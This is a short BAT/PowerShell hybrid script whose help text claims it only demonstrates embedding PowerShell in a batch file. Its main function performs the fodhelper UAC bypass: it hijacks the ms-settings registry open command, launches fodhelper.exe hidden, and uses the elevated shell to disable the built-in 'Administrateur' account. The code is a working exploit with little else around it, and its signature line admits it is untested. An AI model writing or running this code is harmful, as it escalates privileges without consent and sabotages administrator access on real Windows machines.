<# ::
@echo off
powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
goto :eof

.SYNOPSIS
This script demonstrate how to embed PowerShell in a BAT file and allow
command-line arguments.

.DESCRIPTION
The top of the script begins with <#:: which is a batch redirection direcctive
meaning that <#: will be parsed as :<# which looks like a label in a batch script
but <# is also a valid powershell comment opener.

The next line turns off echo for batch scripts but remember we're now in a PowerShell
comment block so this is meaningless when the script is loaded by PowerShell.

And the last important line is the third line which invokes powershell.exe, loading
the current script. Note also that it invokes the 'main' function in the content
so we must implement a 'main' function below. Finally, we pass %* into the main
function which is the command-line argument collection for the batch script.
#>

function main
{
	param(
		[string] $Argument1,
		[switch] $Argument2
	)

	Invoke-Expression -Command 'echo Coded By 1337r00t Sorry i Am not testing this tool'
		New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force
		New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force
		Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'C:\Windows\System32\cmd.exe /k net user Administrateur /active:no' -Force
		
		Start-Process 'C:\Windows\System32\fodhelper.exe' (Resolve-Path .\).Path -WindowStyle Hidden
		
		
}
